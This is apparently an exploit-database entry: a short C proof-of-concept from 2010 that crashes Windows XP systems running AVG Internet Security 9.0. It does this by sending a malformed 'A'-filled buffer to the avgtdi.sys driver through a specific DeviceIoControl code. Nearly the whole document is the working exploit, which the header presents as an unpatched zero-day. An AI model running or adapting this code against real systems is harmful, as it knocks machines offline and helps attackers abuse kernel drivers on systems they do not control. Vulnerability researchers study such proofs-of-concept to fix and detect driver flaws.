/*
# Exploit Title: AVG Internet Security 0day Local DoS Exploit
# Date: 2010-11-01
# Author: Nikita Tarakanov (CISS Research Team)
# Software Link: http://www.avg.com
# Version: up to date, version 9.0.851, avgtdix.sys version 9.0.0.832
# Tested on: Win XP SP3
# CVE : CVE-NO-MATCH
# Status : Unpatched
*/
 
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <share.h>
 
 
 
int main(int argc, char **argv)
{
    HANDLE   hDevice;
    DWORD    cb;
    void        *buff;
    int outlen = 0x18, inlen = 0x10;
    DWORD ioctl = 0x830020C8;
    char deviceName[] = "\\\\.\\avgtdi";
    char logName[] = "avgtdi.log";
 
    if ( (hDevice = CreateFileA(deviceName,
                          GENERIC_READ|GENERIC_WRITE,
                          0,
                          0,
                          OPEN_EXISTING,
                          0,
                          NULL) ) != INVALID_HANDLE_VALUE )
    {
        printf("Device  succesfully opened!\n");
    }
    else
    {
        printf("Error: Error opening device \n");
        return 0;
    }
 
    cb = 0;
    buff = malloc(0x1000);
    if(!buff){
      printf("malloc failed");
      return 0;
    }
    memset(buff, 'A', 0x1000-1);
 
 
 
    DeviceIoControl(hDevice, ioctl, (LPVOID)buff, inlen, (LPVOID)buff, outlen, &cb, NULL);
 
    free(buff);
}